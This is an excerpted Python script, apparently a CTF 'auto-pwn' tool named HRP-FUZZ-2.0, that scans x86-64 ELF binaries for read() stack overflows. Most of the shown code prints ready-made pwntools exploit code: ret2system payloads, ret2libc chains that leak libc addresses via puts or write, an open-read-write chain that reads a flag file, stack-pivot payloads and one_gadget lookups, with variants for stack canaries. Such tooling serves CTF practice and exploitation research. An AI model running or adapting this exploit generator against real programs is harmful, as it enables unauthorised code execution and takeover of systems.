    ...
    for item in list(Function_Name.keys()):
        try:
            ...
            if file_os==18:
                ...
                print(("[+]Found "+str(item)+" address:"+hex(Function_Name[item])))
...
def search_call_what(elf,file_name,argv):
    ...
    for i in range(call_len):
        ...
        Relative_address=(u64(elf.read(int(call_addr[i]),5)[1:5].ljust(8,b'\x00')))
    ...
    for i in call_addr:
        ...
        if plus_minus==0xff:
            Relative_address=(u64(elf.read(int(i),5)[1:5].ljust(8,b'\x00')))
            Relative_len=0xffffffff-Relative_address-4
    ...
    try:
        ...
        for y in Call_list:
            ...
            if isinstance(a, str):
                continue
            if a == tmp:
                    recursive_search_call_chain(y, current_chain) # 递归调用，将当前的调用点添加到调用链中
...
def solve_read(elf,addr,file_name,file_os):
    ...
    if tmp_chek==0x458D48:
        ...
        if tmp_chek==0x858D48:
            rsi=0x100000000-u64(elf.read(tmp_addr-7,7)[3:].ljust(8,b'\x00'))
            Stack_migration_address=tmp_addr-7
    print(("[+]rsi:"+hex(rsi)))
    #rsi<rdx判断为栈溢出交由栈溢出判断函数
    if rsi<rdx:
        overturn_Call_list= dict(list(zip(list(Call_list.values()), list(Call_list.keys()))))
            ...
            if auto_flag==True:
                for index in chain:
                    for i in range(1,len(index)):
                        ...
                        auto_pwn_result_list.append(fuzz2.find_input_strings(file_name,int(start_addr),int(end_addr),int(target_addr),1024))
                        print("[+]All need:",auto_pwn_result_list)
                        auto_success=True
                #优化特殊结果:such as -0+0066556
                for li in auto_pwn_result_list:
                    for i in range(len(li)):
                        try:
                            ...
                            # 转换为整数类型
                            integer = int(string)
                            # 如果原字符串第一个字符为'-'，则将整数变为负数
                            if string[0] == '-':
                                integer *= -1
                                print(integer)
                        except Exception as e:
                            pass
                solve_read_overflow(addr,rsi,rdx,file_name,file_os,Stack_migration_address,auto_success)
            else:
                auto_success=False
                solve_read_overflow(addr,rsi,rdx,file_name,file_os,Stack_migration_address,auto_success)
        else:
...
def solve_read_overflow(addr,rsi,rdx,file_name,file_os,Stack_migration_address,auto_success):
    system=False
    system_be_called=[]
    sub=rdx-rsi
    strs=''
    ...
    if sub>0x28:
        ...
        for function in list(overturn_Call_list.keys()):
            if function=='system':
                system=True
                system_be_called.append(Hierarchical_list[overturn_Call_list[function]])
                strs_addr=u64(elf.read(overturn_Call_list[function]-7,7)[3:].ljust(8,b'\x00'))+(overturn_Call_list[function])
        ...
        if system:
            for i in range(len(system_be_called)):
                print(("[+]Found system(execve) be called by function:"+hex(system_be_called[i])+" and system(xx) is "+str(strs[0])))
                if i==0:
                    ...
                    if  elf.canary==False and elf.pie!=True:
                        ...
                        if auto_success:
                            for i in auto_pwn_result_list:
                                if len(i)>0:
                                    for j in i:
                                        print("r.recv(timeout=1)")
                                        print("r.sendline("+str(j)+")")
                        print(("payload="+"b'a'*"+hex(rsi+8)+"+p64("+hex(ret)+")"+"+p64("+hex(system_be_called[i])+")"))
                        print("r.send(payload)")
                        print("r.interactive()")
                    elif elf.canary==True and elf.pie!=True:
                        ret=next(elf.search(asm("ret")))
                        print("#encoding=utf-8")
                        if file_os:
                            print("#如果是Ubuntu20-22下的system利用其中的ret看具体情况要不要去掉")
                            ...
                            for i in auto_pwn_result_list:
                                if len(i)>0:
                                    for j in i:
                                        print("r.recv(timeout=1)")
                                        print("r.sendline("+str(j)+")")
                        print(("payload="+"b'a'*"+hex(rsi-8)+"+p64(canary)+b'a'*8"+"+p64("+hex(ret)+")"+"+p64("+hex(system_be_called[i])+")"))
                        print("r.send(payload)")
                        print("r.interactive()")
                        print("")
        #ret2libc & orw
        if system == False:
            ...
            if elf.pie!=True:
                ...
                if 'puts' in Function_Name:
                    ...
                    if elf.canary:
                        print(("payload=b'a'*"+hex(rsi-8)+"+p64(canary)+b'a'*8+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(Hierarchical)"))
                    else:
                        print(("payload=b'a'*"+hex(rsi+8)+"+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(Hierarchical)"))
                    print("r.send(payload)")
                    ...
                    if elf.canary:
                        print(("payload=b'a'*"+hex(rsi-8)+"+p64(canary)+b'a'*8+p64(rdi)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0)+p64(write_plt)+p64(Hierarchical)"))
                    else:
                        print(("payload=b'a'*"+hex(rsi+8)+"+p64(rdi)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0)+p64(write_plt)+p64(Hierarchical)"))
                    print("r.send(payload)")
                    print("leak=u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00+'))")
                ...
                if 'prctl' not in Function_Name:
                    ...
                    if elf.canary:
                        print(("payload2=b'a'*"+hex(rsi-8)+"+p64(canary)+b'a'*8+p64(rdi)+p64(sh)+p64(ret)+p64(system)+p64(Hierarchical)"))
                    else:
                        print(("payload2=b'a'*"+hex(rsi+8)+"+p64(rdi)+p64(sh)+p64(ret)+p64(system)+p64(Hierarchical)"))
                    ...
                    print("rdx=base+rdx")
                    if elf.canary:
                        print(("payload2=b'a'*"+hex(rsi-8)+"+p64(canary)+b'a'*8+p64(rdi)+p64(0)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(rdx)+p64(0x200)+p64(the_read)+p64(Hierarchical)"))
                    else:
                        print(("payload2=b'a'*"+hex(rsi+8)+"+p64(rdi)+p64(0)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(rdx)+p64(0x200)+p64(the_read)+p64(Hierarchical)"))
                    print("r.send(payload2)")
                    print("sleep(1)")
                    print("r.send('flag\x00/')")
                    if elf.canary:
                        print(("payload3=b'a'*"+hex(rsi-8)+"+p64(canary)+b'a'*8+p64(rdi)+p64(bss)+p64(pop_rsi_r15_ret)+p64(0664)+p64(0)+p64(the_open)"))
                    else:
                        print(("payload3=b'a'*"+hex(rsi+8)+"+p64(rdi)+p64(bss)+p64(pop_rsi_r15_ret)+p64(0664)+p64(0)+p64(the_open)"))
                    print("payload3+=p64(rdi)+p64(3)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(rdx)+p64(0x200)+p64(the_read)")
                    print("payload3+=p64(rdi)+p64(1)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(the_write)")
    ...
    if sub==0x10:
        ...
        if 'puts' in Function_Name:
            print("puts_got=elf.got['puts']")
            print("puts_plt=elf.plt['puts']")
            print(("payload=b'a'*"+hex(rsi)+"+p64(bss+0x300)+p64(Stack_migration_address)"))
            print("r.send(payload)")
            print("sleep(1)")
            print(("payload=b'a'*"+hex(rsi)+"+p64(bss+0x300+offset)+p64(Stack_migration_address)"))
            print("r.send(payload)")
            print("sleep(1)")
            print("payload2=p64(bss+0x300+offset+0x10)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(Stack_migration_address)")
            print("r.send(payload2)")
            print("sleep(1)")
            print("leak=u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00+'))")
            print("base=leak-libc.sym['puts']")
            ...
            cmd = os.popen("one_gadget "+str(elf.libc).split("'")[1]+" --level 1")
...
if __name__ == '__main__':
    ...
    try:
        ...
        end_address = start_address + elf.get_section_by_name('.text').header.sh_size
        if elf.arch=='i386':
            print("[+]WE DO NOT SUPPORT I386 BINARY!")
            exit(0)
    except Exception as e:
        print("[+]Usage:python3 HRP-FUZZ-2.0.py ./filepath <auto>")
    else:
        canary=elf.canary
